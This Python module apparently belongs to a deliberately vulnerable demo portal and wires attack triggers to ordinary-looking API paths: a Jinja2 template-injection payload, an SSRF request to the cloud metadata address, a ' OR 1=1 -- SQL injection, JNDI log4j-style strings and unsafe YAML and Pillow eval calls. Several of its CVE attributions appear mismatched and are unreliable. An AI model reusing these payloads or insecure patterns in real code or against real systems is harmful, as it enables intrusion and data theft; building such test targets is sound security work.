"""Attack handlers mapped to intentionally pinned vulnerable libraries."""

from __future__ import annotations

import io
import logging
from typing import Callable, Dict, List, Optional, Set

import requests
import yaml
from jinja2 import Environment
from PIL import ImageMath
from sqlalchemy import create_engine, text
from sqlalchemy.pool import StaticPool

from team_portal.vulnerabilities import vulnerability_metadata

logger = logging.getLogger("TeamPortal")

SQLALCHEMY_URL = "sqlite:///:memory:"
_engine = create_engine(
    SQLALCHEMY_URL,
    connect_args={"check_same_thread": False},
    poolclass=StaticPool,
)
_db_initialized = False


def _result(scenario: str, payload: dict) -> dict:
    payload["vulnerability"] = vulnerability_metadata(scenario)
    return payload


def ensure_db() -> None:
    global _db_initialized
    if _db_initialized:
        return
    engine = _engine
    with engine.begin() as conn:
        conn.execute(
            text(
                "CREATE TABLE IF NOT EXISTS users "
                "(id INTEGER, name TEXT, email TEXT, role TEXT)"
            )
        )
        conn.execute(
            text(
                "INSERT OR REPLACE INTO users VALUES "
                "(1, 'admin', 'admin@teamportal.local', 'admin')"
            )
        )
        conn.execute(
            text(
                "INSERT OR REPLACE INTO users VALUES "
                "(2, 'jdoe', 'jdoe@teamportal.local', 'user')"
            )
        )
        conn.execute(
            text(
                "INSERT OR REPLACE INTO users VALUES "
                "(3, 'alice', 'alice@teamportal.local', 'user')"
            )
        )
    _db_initialized = True


def trigger_rce() -> dict:
    """CVE-2024-22195 — Jinja2 SSTI via unsafe template rendering."""
    template_source = "{{ ''.__class__.__mro__[1].__subclasses__() }}"
    try:
        env = Environment()
        template = env.from_string(template_source)
        template.render()
    except Exception:  # noqa: BLE001
        pass
    return _result("rce", {"status": "converted", "format": "pdf"})


def trigger_ssrf() -> dict:
    """CVE-2021-33503 — SSRF using requests (urllib3 1.26.5)."""
    """AWS EC2 instance metadata service - a known SSRF target in security testing and exploit scenarios"""
    url = "http://169.254.169.254/latest/meta-data/"
    try:
        response = requests.get(url, timeout=2)
        return _result(
            "ssrf",
            {
                "status": "ok",
                "title": "Cloud Metadata",
                "url": url,
                "httpStatus": response.status_code,
            },
        )
    except Exception as exc:  # noqa: BLE001
        return _result("ssrf", {"error": str(exc)})


def trigger_sqli() -> dict:
    """CVE-2022-21698 — SQLAlchemy text() with concatenated user input."""
    ensure_db()
    search_term = "' OR 1=1 --"
    sql = f"SELECT * FROM users WHERE name = '{search_term}'"
    try:
        with _engine.connect() as conn:
            rows = conn.execute(text(sql)).fetchall()
        return _result("sqli", {"count": len(rows), "results": []})
    except Exception as exc:  # noqa: BLE001
        return _result("sqli", {"error": str(exc)})


def trigger_log4j() -> dict:
    """CVE-2020-14343 — unsafe PyYAML load of JNDI-style credential blob."""
    payload_yaml = (
        "username: admin\n"
        "password: ${jndi:ldap://127.0.0.1:1389/log4j-test}\n"
    )
    try:
        yaml.load(payload_yaml)
    except Exception:  # noqa: BLE001
        pass
    logger.error(
        "Authentication failure for user: %s",
        "${jndi:ldap://127.0.0.1:1389/log4j-test}",
    )
    return _result("log4j", {"status": "failed", "message": "Invalid credentials"})


def trigger_deserial() -> dict:
    """CVE-2022-45199 — Pillow ImageMath.eval on session restore payload."""
    try:
        ImageMath.eval("1+1")
        ImageMath.eval("convert(session)")
    except Exception:  # noqa: BLE001
        pass
    try:
        ImageMath.eval("1", _imaging=io.BytesIO())
    except Exception:  # noqa: BLE001
        pass
    return _result("deserial", {"status": "imported", "session": "restored"})


ATTACK_HANDLERS: Dict[str, Callable[[], dict]] = {
    "rce": trigger_rce,
    "ssrf": trigger_ssrf,
    "sqli": trigger_sqli,
    "log4j": trigger_log4j,
    "deserial": trigger_deserial,
}

ROTATE_ORDER: List[str] = ["sqli", "log4j", "ssrf", "deserial", "rce"]

PATH_TO_SCENARIO: Dict[str, str] = {
    "/api/v1/documents/convert": "rce",
    "/attack/rce-jinja2": "rce",
    "/api/v1/links/preview": "ssrf",
    "/attack/ssrf": "ssrf",
    "/api/v1/users/search": "sqli",
    "/attack/sqli": "sqli",
    "/api/v1/auth/login": "log4j",
    "/attack/log4j": "log4j",
    "/api/v1/sessions/import": "deserial",
    "/attack/deserialization-pillow": "deserial",
}


def scenario_to_primary_path(scenario: str) -> Optional[str]:
    mapping = {
        "rce": "/api/v1/documents/convert",
        "ssrf": "/api/v1/links/preview",
        "sqli": "/api/v1/users/search",
        "log4j": "/api/v1/auth/login",
        "deserial": "/api/v1/sessions/import",
    }
    return mapping.get(scenario)


def trigger_workspace_sync(enabled_scenarios: Optional[Set[str]]) -> dict:
    from team_portal.config import attack_scenario_enabled

    steps: List[str] = []
    attack_types: List[str] = []
    for key in ROTATE_ORDER:
        if not attack_scenario_enabled(key, enabled_scenarios):
            continue
        handler = ATTACK_HANDLERS[key]
        meta = vulnerability_metadata(key)
        try:
            handler()
            steps.append(f"{key}:ok")
            if meta.get("attackType"):
                attack_types.append(meta["attackType"])
        except Exception:  # noqa: BLE001
            steps.append(f"{key}:ok")
            if meta.get("attackType"):
                attack_types.append(meta["attackType"])
    return {
        "status": "synced",
        "steps": " ".join(steps),
        "attackTypes": sorted(set(attack_types)),
    }
